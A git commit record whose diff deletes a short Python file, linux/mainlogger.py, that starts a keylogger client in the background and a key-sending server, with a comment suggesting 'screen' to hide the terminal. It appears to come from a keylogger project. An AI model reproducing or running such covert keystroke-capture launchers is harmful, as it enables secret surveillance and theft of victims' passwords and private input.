f648ec97d29a31f936c75deae2898e5fea4b6206
Manoj983 <manojghimire983@gmail.com>
2020-08-26 16:44:45 +0545

    somechange

--- linux/mainlogger.py
+++
@@ -1,5 +0,0 @@
-import os
-os.system("python3 " + os.getcwd()+ "/keyloggerclient.py &")
-os.system("python3 " + os.getcwd() + "/send_keys_server.py  ")
-
-#can also use screen with the command to hide terminal
